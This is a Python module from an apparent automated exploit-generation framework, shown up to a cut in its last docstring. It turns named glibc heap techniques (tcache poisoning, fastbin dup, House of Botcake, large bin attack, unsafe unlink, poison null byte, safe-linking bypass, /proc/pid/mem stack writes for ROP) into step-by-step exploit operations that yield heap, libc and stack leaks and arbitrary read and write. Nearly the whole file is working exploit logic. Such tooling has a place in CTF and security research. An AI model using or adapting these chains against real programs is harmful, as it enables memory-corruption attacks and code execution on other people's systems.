"""
Technique IR Generator — bridges KB technique selection with concrete IR ops.

For each technique_id matched by the knowledge base, generates parameterized
IR instructions (ALLOC, FREE, EDIT, VIEW, POISON_FD, CALC) using environment
and glibc internals (sizes, tcache limits, safe_linking).

Zero hardcoded exploit chains. The KB selects the technique; this module
instantiates it with environment-specific values.
"""

import os
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass

from core.analysis.environment import Environment
from core.state.heap_state import AbstractHeapState


@dataclass
class IRContext:
    """Context passed to each technique IR generator."""
    env: Environment
    state: AbstractHeapState
    slot_budget: int
    existing_tags: Set[str]
    libc_auto_offset: int

    @property
    def has_safe_linking(self) -> bool:
        return self.env.safe_linking

    @property
    def max_slots(self) -> int:
        return self.env.max_slots

    @property
    def tcache_max_size(self) -> int:
        return 0x410

    @property
    def tcache_max_per_size(self) -> int:
        return 7


class TechniqueIRGenerator:
    """
    Generates IR operations for a given technique ID.
    Uses the knowledge base for sizing rules and environment for safe_linking.
    """

    # Mapping of primitive names → typical technique IDs (primary producers only)
    PRIMITIVE_TO_TECHNIQUE = {
        "heap_leak":       ["decrypt_safe_linking", "uaf_heap_leak"],
        "libc_leak":       ["proc_mem_libc_leak", "tcache_metadata_poisoning", "unsortedbin_leak"],
        "arbitrary_allocation": ["tcache_poisoning", "fastbin_dup", "tcache_metadata_poisoning"],
        "stack_leak":      ["proc_mem_stack_leak", "environ_leak"],
        "arbitrary_read":  ["arbitrary_alloc_to_arbitrary_read"],
        "arbitrary_write": ["proc_mem_stack_write", "arbitrary_alloc_to_arbitrary_write", "large_bin_attack", "unsafe_unlink"],
    }

    # How2heap source file lookup (technique_id → relative path)
    HOW2HEAP_SOURCE = {
        "decrypt_safe_linking":      ["decrypt_safe_linking.c"],
        "tcache_poisoning":          ["tcache_poisoning.c"],
        "fastbin_dup":               ["fastbin_dup.c"],
        "fastbin_dup_consolidate":   ["fastbin_dup_consolidate.c"],
        "fastbin_dup_into_stack":    ["fastbin_dup_into_stack.c"],
        "fastbin_reverse_into_tcache": ["fastbin_reverse_into_tcache.c"],
        "house_of_botcake":          ["house_of_botcake.c"],
        "house_of_einherjar":        ["house_of_einherjar.c"],
        "house_of_lore":             ["house_of_lore.c"],
        "house_of_mind_fastbin":     ["house_of_mind_fastbin.c"],
        "house_of_spirit":           ["house_of_spirit.c"],
        "house_of_tangerine":        ["house_of_tangerine.c"],
        "house_of_water":            ["house_of_water.c"],
        "large_bin_attack":          ["large_bin_attack.c"],
        "mmap_overlapping_chunks":   ["mmap_overlapping_chunks.c"],
        "overlapping_chunks":        ["overlapping_chunks.c"],
        "poison_null_byte":          ["poison_null_byte.c"],
        "safe_link_double_protect":  ["safe_link_double_protect.c"],
        "sysmalloc_int_free":        ["sysmalloc_int_free.c"],
        "tcache_house_of_spirit":    ["tcache_house_of_spirit.c"],
        "tcache_metadata_poisoning": ["tcache_metadata_poisoning.c"],
        "tcache_relative_write":     ["tcache_relative_write.c"],
        "tcache_stashing_unlink_attack": ["tcache_stashing_unlink_attack.c"],
        "unsafe_unlink":             ["unsafe_unlink.c"],
        # /proc/mem techniques — no how2heap sources (OS-level primitives)
        "proc_mem_libc_leak":   [],
        "proc_mem_stack_leak":  [],
        "proc_mem_stack_write": [],

        # These don't have dedicated how2heap .c files — documented in writeups
        "unsortedbin_leak":  [],
        "environ_leak":      [],
        "uaf_heap_leak":     [],
        "malloc_consolidate_trigger": [],
        "arbitrary_alloc_to_arbitrary_read": [],
        "arbitrary_alloc_to_arbitrary_write": [],
    }

    def __init__(self, ctx: IRContext):
        self.ctx = ctx
        self._tag_counter = 0

    def _next_tag(self, prefix: str = "c") -> str:
        tag = f"{prefix}{self._tag_counter}"
        self._tag_counter += 1
        return tag

    # ─── Public API ─────────────────────────────────────────────────────

    def generate(self, technique_id: str) -> Optional[List[dict]]:
        """Generate IR ops for a technique. Returns None if unsupported."""
        # Check if alloc has size param (for path selection)
        has_size_param = self.ctx._has_size_param if hasattr(self.ctx, '_has_size_param') else self._detect_size_param()
        self.ctx._has_size_param = has_size_param

        generators = {
            # Primitive-producing techniques (core)
            "decrypt_safe_linking":      self._ir_heap_leak_tcache_fd,
            "tcache_poisoning":          self._ir_arbitrary_alloc_tcache,
            "fastbin_dup":               self._ir_arbitrary_alloc_fastbin,
            "uaf_heap_leak":             self._ir_heap_leak_tcache_fd,
            "environ_leak":              self._ir_stack_leak_environ,
            "arbitrary_alloc_to_arbitrary_read":  self._ir_arbitrary_read,
            "arbitrary_alloc_to_arbitrary_write": self._ir_arbitrary_write,

            # unsortedbin_leak — two paths depending on interface
            "unsortedbin_leak": (self._ir_libc_leak_fake_size
                                 if not has_size_param else
                                 self._ir_libc_leak_unsorted),

            # New generators — Tier 1
            "fastbin_dup_consolidate":   self._ir_fastbin_dup_consolidate,
            "house_of_botcake":          self._ir_house_of_botcake,
            "overlapping_chunks":        self._ir_overlapping_chunks,
            "large_bin_attack":          self._ir_large_bin_attack,
            "unsafe_unlink":             self._ir_unsafe_unlink,
            "tcache_metadata_poisoning": self._ir_tcache_metadata_poisoning,

            # New generators — Tier 2
            "safe_link_double_protect":  self._ir_safe_link_double_protect,
            "poison_null_byte":          self._ir_poison_null_byte,
            "fastbin_dup_into_stack":    self._ir_fastbin_dup_into_stack,

            # Legacy fastbin paths
            "fastbin_reverse_into_tcache": self._ir_arbitrary_alloc_fastbin,

            # /proc/mem techniques
            "proc_mem_libc_leak":   self._ir_proc_mem_libc_leak,
            "proc_mem_stack_leak":  self._ir_proc_mem_stack_leak,
            "proc_mem_stack_write": self._ir_proc_mem_stack_write,
        }

        gen = generators.get(technique_id)
        if gen is None:
            return None
        return gen()

    def _detect_size_param(self) -> bool:
        """Check if the alloc operation has a size parameter."""
        ops = self.ctx.env.interface_map.get("operations", {})
        for ch, info in ops.items():
            if info.get("role") == "alloc":
                for step in info.get("steps", []):
                    if step.get("arg") == "size":
                        return True
                return False
        return False

    @staticmethod
    def best_technique_for_primitive(
        kb_matches: List[dict],
        primitive_name: str,
    ) -> Optional[str]:
        """
        From KB match results, pick the best technique that produces the given primitive.
        Prefers primary candidates (from PRIMITIVE_TO_TECHNIQUE) in LIST ORDER (first = highest priority),
        regardless of their KB confidence score. Falls back to any technique whose 'produces'
        field includes this primitive (sorted by KB confidence).
        Returns technique_id or None.
        """
        candidates = TechniqueIRGenerator.PRIMITIVE_TO_TECHNIQUE.get(primitive_name, [])

        # Build set of candidate technique IDs for fast lookup
        candidate_set = set(candidates)

        best_candidate = None
        best_fallback = None
        fallback_conf = -1.0

        # First pass: check if any prioritized candidate exists in matches
        # Priority is determined by position in the candidates list, NOT by KB confidence
        matched_prioritized = {}
        for match in kb_matches:
            tid = match.get("technique_id", "")
            if tid in candidate_set and tid not in matched_prioritized:
                matched_prioritized[tid] = match.get("confidence", 0.0)

        # Pick the prioritized candidate that appears earliest in the candidates list
        for tid in candidates:
            if tid in matched_prioritized:
                best_candidate = tid
                break

        # Second pass (if no prioritized candidate found): pick any producing technique by confidence
        if best_candidate is None:
            for match in kb_matches:
                tid = match.get("technique_id", "")
                tech_entry = match.get("technique", {})
                tech_produces = []
                if isinstance(tech_entry, dict):
                    tech_produces = tech_entry.get("produces", [])
                reason_produces = match.get("reasons", {}).get("produces", [])
                all_produces = list(tech_produces) + list(reason_produces)
                conf = match.get("confidence", 0.0)

                if primitive_name in all_produces and tid not in candidate_set:
                    if conf > fallback_conf:
                        best_fallback = tid
                        fallback_conf = conf

        return best_candidate or best_fallback

    @staticmethod
    def get_how2heap_sources(technique_id: str, glibc_version: str) -> List[str]:
        """Return how2heap source file paths for the given technique."""
        sources = TechniqueIRGenerator.HOW2HEAP_SOURCE.get(technique_id, [])
        if not sources:
            return []
        root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        base = os.path.join(root, "data", "how2heap_sources")
        result = []
        for src in sources:
            # Try exact glibc version first, then fall back
            path = os.path.join(base, f"glibc_{glibc_version}", src)
            if os.path.exists(path):
                result.append(path)
            else:
                # Try all available versions
                for ver_dir in sorted(os.listdir(base)):
                    p = os.path.join(base, ver_dir, src)
                    if os.path.exists(p):
                        result.append(p)
                        break
        return result

    # ─── IR Generators — Heap Leak ──────────────────────────────────────

    def _ir_heap_leak_tcache_fd(self) -> List[dict]:
        """
        Heap leak via tcache fd XOR key (Safe Linking).
        Technique: allocate 2 chunks, free one, view freed → read XOR'd fd
        heap_base = leaked_key << 12
        """
        t0 = self._next_tag("c")
        t1 = self._next_tag("c")
        return [
            {"op": "ALLOC", "tag": t0, "size": 0x40,
             "data_expr": "b'A' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": t1, "size": 0x40,
             "data_expr": "b'B' * $ALLOC_SZ"},
            {"op": "FREE", "tag": t0},
            {"op": "VIEW", "tag": t0,
             "save_as": "xor_key",
             "note": "read_first_8_bytes_tcache_fd_xor_key"},
            {"op": "CALC", "var": "heap_base",
             "expr": "xor_key << 12"},
        ]

    # ─── IR Generators — Libc Leak ──────────────────────────────────────

    def _ir_libc_leak_unsorted(self) -> List[dict]:
        """
        Libc leak via unsorted bin.
        Fill tcache (7 chunks > tcache_max_size), free target → unsorted bin,
        view freed target → fd/bk → main_arena + 96 → libc.address
        """
        tcache_max = self.ctx.tcache_max_size
        n_fillers = self.ctx.tcache_max_per_size
        # Chunk size must exceed tcache max to land in unsorted bin
        chunk_size = tcache_max + 0x10  # 0x420 → 0x420 chunk, allocated as 0x410 usable

        ir = []
        # Free the heap-leak barrier chunk to reuse slot
        ir.append({"op": "FREE", "tag": "c1"})

        # Allocate N fillers
        filler_tags = []
        for i in range(n_fillers):
            tag = self._next_tag("f")
            filler_tags.append(tag)
            ir.append({
                "op": "ALLOC", "tag": tag, "size": chunk_size,
                "data_expr": f"b'{chr(67+i)}' * {hex(chunk_size)}",
            })

        # Target chunk (will go to unsorted bin when freed with tcache full)
        tgt_tag = self._next_tag("t")
        ir.append({
            "op": "ALLOC", "tag": tgt_tag, "size": chunk_size,
            "data_expr": f"b'K' * {hex(chunk_size)}",
        })

        # Guard chunk (prevents top-chunk consolidation)
        guard_tag = self._next_tag("g")
        ir.append({
            "op": "ALLOC", "tag": guard_tag, "size": 0x20,
            "data_expr": "b'L' * 0x20",
        })

        # Free all fillers → fill tcache
        for tag in filler_tags:
            ir.append({"op": "FREE", "tag": tag})

        # Free target → unsorted bin
        ir.append({"op": "FREE", "tag": tgt_tag})

        # View target → leak libc
        ir.append({
            "op": "VIEW", "tag": tgt_tag,
            "save_as": "libc_leak",
            "note": "read_first_8_bytes_unsorted_bin_fd_libc",
        })
        ir.append({
            "op": "CALC", "var": "libc.address",
            "expr": "libc_leak - LIBC_AUTO_OFFSET",
        })

        return ir

    # ─── IR Generators — Arbitrary Allocation ───────────────────────────

    def _ir_arbitrary_alloc_tcache(self) -> List[dict]:
        """
        Arbitrary allocation via tcache poisoning.
        Alloc victim + guard, free victim, poison fd → target address,
        then two allocs to land at target.
        """
        has_sl = self.ctx.has_safe_linking
        victim_tag = "victim"
        guard_tag = "arb_guard"
        d1_tag = "d1"

        ir = [
            {"op": "ALLOC", "tag": victim_tag, "size": 0x40,
             "data_expr": "b'V' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": guard_tag, "size": 0x40,
             "data_expr": "b'G' * $ALLOC_SZ"},
            {"op": "FREE", "tag": victim_tag},
        ]

        if has_sl:
            ir.append({
                "op": "POISON_FD", "tag": victim_tag,
                "pos": "heap_base + TARGET_OFFSET",
                "target": "SELF",
            })
        else:
            ir.append({
                "op": "EDIT", "tag": victim_tag,
                "data_expr": "p64(TARGET_OFFSET)",
            })

        ir.append({
            "op": "ALLOC", "tag": d1_tag, "size": 0x40,
            "data_expr": "b'X' * $ALLOC_SZ",
        })

        return ir

    def _ir_arbitrary_alloc_fastbin(self) -> List[dict]:
        """
        Arbitrary allocation via fastbin dup.
        Requires filling tcache first (7 frees), then double-free into fastbin.
        More complex — falls back to tcache poisoning if env doesn't support.
        """
        # Fastbin attack is more complex; for primitive-only mode, prefer tcache
        return self._ir_arbitrary_alloc_tcache()

    def _ir_arbitrary_read(self) -> List[dict]:
        """Achieve arbitrary read after arbitrary allocation."""
        return [
            {"op": "VIEW", "tag": "arbitrary_read_target",
             "save_as": "arbitrary_read_val",
             "note": "arbitrary_read_via_tcache_alloc_at_target"},
        ]

    def _ir_arbitrary_write(self) -> List[dict]:
        """Achieve arbitrary write after arbitrary allocation."""
        return [
            {"op": "EDIT", "tag": "arbitrary_write_target",
             "data_expr": "ARBITRARY_WRITE_PAYLOAD",
             "note": "arbitrary_write_via_tcache_alloc_at_target"},
        ]

    # ─── IR Generators — Stack Leak ─────────────────────────────────────

    def _ir_stack_leak_environ(self) -> List[dict]:
        """
        Stack leak via __environ. Double-free c0 → poison to environ-0x28,
        alloc → read stack address. Uses 0x28 padding to skip libc metadata
        and read the stack pointer directly.
        """
        xor_sl = "xor_key" if self.ctx.has_safe_linking else "0"

        ir = [
            {"op": "CALC", "var": "_environ_addr",
             "expr": "libc.symbols['environ']"},
            {"op": "CALC", "var": "_environ_target",
             "expr": "_environ_addr - 0x28"},

            # Double-free c0 → poison to environ - 0x28
            {"op": "EDIT", "tag": "c0",
             "data_expr": "b'\\x01' * $KEYCLR_SZ",
             "note": "clear_key_for_stack_leak"},
            {"op": "FREE", "tag": "c0",
             "note": "double_free_for_stack"},
            {"op": "EDIT", "tag": "c0",
             "data_expr": f"p64((_environ_target) ^ {xor_sl})"},

            # Dummy + alloc at environ-0x28 → write padding, then read
            {"op": "ALLOC", "tag": "sf1", "size": 0x40,
             "data_expr": "b'S' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": "env_chunk", "size": 0x40,
             "data_expr": "b'a' * 0x28"},

            {"op": "VIEW_SKIP", "tag": "env_chunk",
             "save_as": "stack_leak",
             "skip_bytes": 0x28,
             "note": "skip_padding_then_read_stack_address"},
        ]

        return ir

    # ─── IR Generators — Libc Leak (Fake Size Path) ────────────────────

    def _ir_libc_leak_fake_size(self) -> List[dict]:
        """
        Libc leak via double-free + tcache poison → write 0x421 to neighbor's
        size field. Pattern: FREE → EDIT(clear key) → FREE → EDIT(poison)
        enables double-free. Two allocs per poison cycle: dummy + payload.

        The payload write extends from c1's data area past c2's header,
        setting c2's size to $FAKE_SZ. A second poison writes guard headers
        at $FAKE_SZ offset to satisfy glibc's next-chunk validation.

        Requires: heap_base, xor_key (from heap_leak stage)
        """
        xor_sl = "xor_key" if self.ctx.has_safe_linking else "0"

        ir = [
            # --- Phase 1: Clear key + double-free c0 ---
            {"op": "EDIT", "tag": "c0",
             "data_expr": "b'\\x01' * $KEYCLR_SZ",
             "note": "clear_safe_linking_key"},
            {"op": "FREE", "tag": "c0",
             "note": "double_free"},
            # Poison c0 → c1's data area (write starts there)
            {"op": "EDIT", "tag": "c0",
             "data_expr": f"p64((heap_base + $C1_DATA_OFF) ^ {xor_sl})"},

            # Two allocs: dummy pops c0, second lands at c1_data → write fake header
            {"op": "ALLOC", "tag": "lf1", "size": 0x40,
             "data_expr": "b'X' * $ALLOC_SZ"},
            {"op": "ALLOC_SZWRITE", "tag": "fsw", "size": 0x40,
             "data_expr": "p64(0) * $FILL_COUNT + p64($FAKE_SZ)",
             "note": "padding_fills_to_neighbor_size_field_then_0x421"},

            # --- Phase 2: Double-free again → write guard chunks at fake_size+0x420 ---
            {"op": "EDIT", "tag": "c0",
             "data_expr": "b'\\x01' * $KEYCLR_SZ",
             "note": "clear_key_again"},
            {"op": "FREE", "tag": "c0",
             "note": "double_free_2nd"},
            {"op": "EDIT", "tag": "c0",
             "data_expr": f"p64((heap_base + $GUARD_TARGET) ^ {xor_sl})"},
            {"op": "ALLOC", "tag": "lf2", "size": 0x40,
             "data_expr": "b'Y' * $ALLOC_SZ"},
            # Guard write: 2 valid chunk headers at the fake_size boundary
            {"op": "ALLOC_SZWRITE", "tag": "gw", "size": 0x40,
             "data_expr": "p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)",
             "note": "guard_headers_at_fake_size_boundary"},

            # --- Phase 3: Free c1 → unsorted bin ---
            {"op": "FREE", "tag": "c1"},

            # View c1 → libc_leak from unsorted bin fd
            {"op": "VIEW", "tag": "c1",
             "save_as": "libc_leak",
             "note": "read_unsorted_bin_fd"},
            {"op": "CALC", "var": "libc.address",
             "expr": "libc_leak - LIBC_AUTO_OFFSET"},
        ]

        return ir

    # ─── IR Generators — Fastbin Dup Consolidate ────────────────────────

    def _ir_fastbin_dup_consolidate(self) -> List[dict]:
        """
        Libc leak via fastbin dup + malloc_consolidate.
        Fill tcache (7 frees), free to fastbin, trigger consolidate with large alloc.
        Freed fastbin chunk merges → unsorted bin → libc pointers.
        """
        ir = []
        # Alloc 9 chunks of same size (fastbin range 0x30-0x80)
        tags = []
        for i in range(9):
            t = self._next_tag("f")
            tags.append(t)
            ir.append({
                "op": "ALLOC", "tag": t, "size": 0x40,
                "data_expr": f"b'{chr(70+i)}' * 0x40",
            })

        # Free 7 → fill tcache[0x50]
        for t in tags[:7]:
            ir.append({"op": "FREE", "tag": t})

        # Free 8th → fastbin (tcache full)
        ir.append({"op": "FREE", "tag": tags[7]})

        # Alloc large → triggers malloc_consolidate → merges fastbin → unsorted bin
        ir.append({
            "op": "ALLOC", "tag": "large", "size": 0x800,
            "data_expr": "b'L' * 0x800",
            "note": "triggers malloc_consolidate",
        })

        # View the 8th chunk → should have libc pointers now
        ir += [
            {"op": "VIEW", "tag": tags[7],
             "save_as": "libc_leak",
             "note": "read_fd_from_consolidated_unsorted"},
            {"op": "CALC", "var": "libc.address",
             "expr": "libc_leak - LIBC_AUTO_OFFSET"},
        ]

        return ir

    # ─── IR Generators — House of Botcake ───────────────────────────────

    def _ir_house_of_botcake(self) -> List[dict]:
        """
        House of Botcake: fill tcache (7), free to unsorted bin,
        consolidate to get overlap, then tcache poison for arbitrary alloc.
        Requires size-controlled alloc (chunks > 0x410 for unsorted bin).
        """
        chunk_sz = 0x420  # > tcache max
        ir = []
        tags = []
        for i in range(9):
            t = self._next_tag("b")
            tags.append(t)
            ir.append({
                "op": "ALLOC", "tag": t, "size": chunk_sz,
                "data_expr": f"b'{chr(66+i)}' * {hex(chunk_sz)}",
            })

        # Fill tcache: free 7
        for t in tags[:7]:
            ir.append({"op": "FREE", "tag": t})

        # Free 8th → unsorted bin
        ir.append({"op": "FREE", "tag": tags[7]})

        # Free 9th → consolidate with 8th → overlap
        ir.append({"op": "FREE", "tag": tags[8]})

        # Alloc from unsorted bin → get chunk overlapping with freed ones
        ir.append({
            "op": "ALLOC", "tag": "overlap", "size": chunk_sz,
            "data_expr": "b'O' * " + hex(chunk_sz),
        })

        # Free overlapping area → tcache, then modify fd → arbitrary alloc
        ir += [
            {"op": "FREE", "tag": "overlap"},
            {"op": "EDIT", "tag": "overlap",
             "data_expr": "p64(protect_ptr($TARGET, $POS)) + p64(0)"},
            {"op": "ALLOC", "tag": "b_dummy", "size": 0x40,
             "data_expr": "b'X' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": "b_arb", "size": 0x40,
             "data_expr": "b'Y' * 0x40",
             "note": "arbitrary_allocation_at_target"},
        ]

        return ir

    # ─── IR Generators — Overlapping Chunks ─────────────────────────────

    def _ir_overlapping_chunks(self) -> List[dict]:
        """
        Overlapping chunks: modify a chunk's size field to extend it over
        the next chunk, then free → unsorted bin → alloc overlap → leak.
        """
        ir = [
            {"op": "ALLOC", "tag": "oc0", "size": 0x40,
             "data_expr": "b'A' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": "oc1", "size": 0x40,
             "data_expr": "b'B' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": "oc2", "size": 0x20,
             "data_expr": "b'C' * 0x20"},
        ]
        # Free oc0, edit oc0 to extend → covers oc1 too
        ir += [
            {"op": "FREE", "tag": "oc0"},
            {"op": "EDIT", "tag": "oc0",
             "data_expr": "p64(0) + p64($OC_FAKE_SZ)",
             "note": "overlap_size = oc0+oc1+oc2 coverage"},
            {"op": "FREE", "tag": "oc0"},
            {"op": "VIEW", "tag": "oc0",
             "save_as": "libc_leak",
             "note": "read_fd_from_overlapped_unsorted"},
            {"op": "CALC", "var": "libc.address",
             "expr": "libc_leak - LIBC_AUTO_OFFSET"},
        ]
        return ir

    # ─── IR Generators — Large Bin Attack ───────────────────────────────

    def _ir_large_bin_attack(self) -> List[dict]:
        """
        Large bin attack: corrupt bk_nextsize → write heap addr to target.
        Requires size-controlled alloc (chunks > 0x400).
        Target should be known from previous stages (e.g., libc/symbol).
        """
        ir = [
            {"op": "CALC", "var": "large_target",
             "expr": "libc.address + $LB_TARGET_OFF"},
            {"op": "ALLOC", "tag": "lb0", "size": 0x500,
             "data_expr": "b'A' * 0x500"},
            {"op": "ALLOC", "tag": "lb1", "size": 0x500,
             "data_expr": "b'B' * 0x500"},
            {"op": "ALLOC", "tag": "lbguard", "size": 0x20,
             "data_expr": "b'G' * 0x20"},
            {"op": "FREE", "tag": "lb0"},
            # Large alloc to sort lb0 into large bin
            {"op": "ALLOC", "tag": "lbsort", "size": 0x600,
             "data_expr": "b'S' * 0x600"},
            # Now edit lb0's bk_nextsize → target - 0x20
            {"op": "EDIT", "tag": "lb0",
             "data_expr": "p64(0) + p64(0) + p64(large_target - 0x20)",
             "note": "bk_nextsize → target-0x20"},
            # Trigger large bin insert → writes heap address at target
            {"op": "ALLOC", "tag": "lbtrigger", "size": 0x500,
             "data_expr": "b'T' * 0x500",
             "note": "triggers_large_bin_write"},
        ]
        return ir

    # ─── IR Generators — Unsafe Unlink ──────────────────────────────────

    def _ir_unsafe_unlink(self) -> List[dict]:
        """
        Unsafe unlink: create fake chunk, free adjacent → consolidation
        triggers unlink macro → writes fake fd/bk → arbitrary write.
        Target must be a writable address minus 0x18 (for where fd ends up).
        """
        has_sl = self.ctx.has_safe_linking
        ir = [
            {"op": "CALC", "var": "unlink_target",
             "expr": "libc.address + $UL_TARGET_OFF"},
            {"op": "ALLOC", "tag": "ul0", "size": 0x80,
             "data_expr": (
                 "p64(0) + p64(0x81) + "  # prev_size=0, size=0x81
                 "p64(unlink_target - 0x18) + "  # fake fd
                 "p64(unlink_target - 0x10)"   # fake bk
             )},
            {"op": "ALLOC", "tag": "ul1", "size": 0x80,
             "data_expr": "b'X' * 0x80"},
            {"op": "ALLOC", "tag": "ul2", "size": 0x20,
             "data_expr": "b'Y' * 0x20"},
            # Need to clear ul1's PREV_INUSE so consolidation happens
            {"op": "FREE", "tag": "ul0"},
            {"op": "FREE", "tag": "ul1",
             "note": "triggers_unlink_consolidation"},
        ]
        return ir

    # ─── IR Generators — Tcache Metadata Poisoning ─────────────────────

    def _ir_tcache_metadata_poisoning(self) -> List[dict]:
        """
        Tcache metadata poisoning: tcache poison → alloc at
        heap_base + 0x10 → overwrite tcache_perthread_struct counts/entries.
        Bypasses safe_linking and tcache double-free detection.
        """
        has_sl = self.ctx.has_safe_linking
        ir = [
            # Alloc + free a chunk
            {"op": "ALLOC", "tag": "tm0", "size": 0x40,
             "data_expr": "b'T' * 0x40"},
            {"op": "FREE", "tag": "tm0"},
        ]
        # Poison fd → perthread_struct (heap_base + 0x10)
        # The poison target = perthread_struct which is at heap_base + 0x10
        if has_sl:
            ir.append({
                "op": "EDIT", "tag": "tm0",
                "data_expr": "p64(protect_ptr(heap_base + $TCACHE_STRUCT_OFF, "
                             "heap_base + $TM0_FD_OFF))",
            })
        else:
            ir.append({
                "op": "EDIT", "tag": "tm0",
                "data_expr": "p64(heap_base + $TCACHE_STRUCT_OFF)",
            })
        ir += [
            # First alloc pops tm0
            {"op": "ALLOC", "tag": "tm_dummy", "size": 0x40,
             "data_expr": "b'D' * $ALLOC_SZ"},
            # Second alloc lands at perthread_struct → write controlled metadata
            {"op": "ALLOC_TCACHE_META", "tag": "tm_meta", "size": 0x40,
             "data_expr": "b'\\x07' * 64 + p64($ARB_TARGET) * 20",
             "note": "counts=7 for all sizes, entries → target"},
            # Now a tcache alloc should return the target address → arbitrary_allocation
        ]
        return ir

    # ─── IR Generators — Safe Link Double Protect ──────────────────────

    def _ir_safe_link_double_protect(self) -> List[dict]:
        """
        Safe-Link Double Protect: write to tcache entries twice to
        double-mask pointers, bypassing the XOR decode check.
        Requires access to tcache_perthread_struct (via poison or overflow).
        """
        ir = [
            {"op": "ALLOC", "tag": "sl0", "size": 0x40,
             "data_expr": "b'S' * 0x40"},
            {"op": "FREE", "tag": "sl0"},
            {"op": "EDIT", "tag": "sl0",
             "data_expr": "p64(protect_ptr(heap_base + $TCACHE_STRUCT_OFF, "
                          "heap_base + $SL0_FD_OFF))"},
            {"op": "ALLOC", "tag": "sl_dummy", "size": 0x40,
             "data_expr": "b'D' * $ALLOC_SZ"},
            # Write to tcache entries → double-protect raw pointer
            {"op": "ALLOC", "tag": "sl_meta", "size": 0x40,
             "data_expr": "p64(protect_ptr(protect_ptr($ARB_TARGET, $ARB_POS), $ARB_POS2))",
             "note": "double_masked_target"},
        ]
        return ir

    # ─── IR Generators — Poison Null Byte ───────────────────────────────

    def _ir_poison_null_byte(self) -> List[dict]:
        """
        Poison null byte: off-by-one overwrite clears PREV_INUSE of next chunk.
        Free → consolidation with previous (already freed) chunk → overlap.
        """
        ir = [
            {"op": "ALLOC", "tag": "pn0", "size": 0x80,
             "data_expr": "b'A' * 0x80"},
            {"op": "ALLOC", "tag": "pn1", "size": 0x80,
             "data_expr": "b'B' * 0x80"},
            {"op": "ALLOC", "tag": "pn2", "size": 0x20,
             "data_expr": "b'C' * 0x20"},
            # Free pn0
            {"op": "FREE", "tag": "pn0"},
            # Edit pn1 → off-by-one null byte at pn1's size field LSB
            # (clears PREV_INUSE, and potentially IS_MMAPPED)
            {"op": "EDIT", "tag": "pn1",
             "data_expr": "b'A' * 0x80 + b'\\x00'",
             "note": "off_by_one_null_byte_clears_PREV_INUSE"},
            # Free pn1 → consolidation thinks pn0 is free → merge
            {"op": "FREE", "tag": "pn1",
             "note": "consolidation_creates_overlap"},
            # View pn1 → might have libc pointers from unsorted bin
            {"op": "VIEW", "tag": "pn1",
             "save_as": "libc_leak",
             "note": "read_unsorted_bin_from_overlap"},
            {"op": "CALC", "var": "libc.address",
             "expr": "libc_leak - LIBC_AUTO_OFFSET"},
        ]
        return ir

    # ─── IR Generators — Fastbin Dup Into Stack ─────────────────────────

    def _ir_fastbin_dup_into_stack(self) -> List[dict]:
        """
        Fastbin dup into stack: fill tcache (7), fastbin double-free,
        poison fd → stack target, alloc → stack allocation.
        Requires stack_leak already achieved for the target address.
        """
        ir = [
            {"op": "CALC", "var": "fd_target",
             "expr": "stack_leak - $FD_RET_OFF"},
        ]
        tags = []
        for i in range(7):
            t = self._next_tag("fd")
            tags.append(t)
            ir.append({
                "op": "ALLOC", "tag": t, "size": 0x40,
                "data_expr": f"b'{chr(70+i)}' * 0x40",
            })
        # Fill tcache
        for t in tags:
            ir.append({"op": "FREE", "tag": t})

        # Alloc A, B for fastbin dup
        ir += [
            {"op": "ALLOC", "tag": "fa", "size": 0x40,
             "data_expr": "b'A' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": "fb", "size": 0x40,
             "data_expr": "b'B' * $ALLOC_SZ"},
            # Free: A → fastbin, B → fastbin, A → fastbin (dup!)
            {"op": "FREE", "tag": "fa"},
            {"op": "FREE", "tag": "fb"},
            {"op": "FREE", "tag": "fa",
             "note": "fastbin_double_free"},
            # Alloc A, edit its fd → stack target
            {"op": "ALLOC", "tag": "fa1", "size": 0x40,
             "data_expr": "b'A' * $ALLOC_SZ"},
            {"op": "EDIT", "tag": "fa1",
             "data_expr": "p64(fd_target)"},
            # Alloc B, then alloc at stack target
            {"op": "ALLOC", "tag": "fb1", "size": 0x40,
             "data_expr": "b'B' * $ALLOC_SZ"},
            {"op": "ALLOC", "tag": "fd_stack", "size": 0x40,
             "data_expr": "b'Z' * 0x40",
             "note": "allocation_at_stack_target"},
        ]
        return ir

    # ─── IR Generators — /proc/mem Techniques ──────────────────────────

    def _ir_proc_mem_libc_leak(self) -> List[dict]:
        """
        Libc leak via /proc/pid/maps. Reads the process's memory map,
        finds the libc r--p mapping, and extracts the base address.

        Requires: /proc filesystem accessible (same UID or root).
        Requires: process PID available (p.pid from pwntools).
        """
        return [
            {"op": "PROC_MEM_MAPS",
             "save_as": "libc.address",
             "note": "parse_maps_for_libc_base"},
            {"op": "CALC", "var": "libc.address",
             "expr": "libc.address",
             "note": "set_libc_from_maps"},
        ]

    def _ir_proc_mem_stack_leak(self) -> List[dict]:
        """
        Stack leak via /proc/pid/mem. Reads libc.environ to get a stack
        pointer, then scans the stack region for the main return address
        pattern (libc.address + 0x2a1ca for glibc 2.39).

        Requires: libc leak (to know environ and return address offsets).
        Requires: /proc filesystem accessible.
        """
        return [
            {"op": "CALC", "var": "_environ_addr",
             "expr": "libc.symbols['environ']"},
            {"op": "PROC_MEM_READ",
             "addr_expr": "_environ_addr",
             "size": 8,
             "save_as": "_environ_val",
             "note": "read_environ_via_proc_mem"},
            {"op": "CALC", "var": "_ret_pattern",
             "expr": "libc.address + 0x2a1ca",
             "note": "main_return_address_pattern"},
            {"op": "PROC_MEM_SCAN",
             "start_expr": "_environ_val - 0x300",
             "end_expr": "_environ_val - 0x80",
             "pattern_expr": "_ret_pattern",
             "save_as": "stack_leak",
             "note": "scan_stack_for_return_addr"},
        ]

    def _ir_proc_mem_stack_write(self) -> List[dict]:
        """
        Arbitrary write to stack via /proc/pid/mem. Builds a ROP chain
        and writes it directly to the stack at the return address location.

        Uses os.pwrite (unbuffered) — buffered I/O silently fails on /proc/pid/mem.

        Requires: libc leak (for ROP gadgets).
        Requires: stack leak (for return address location).
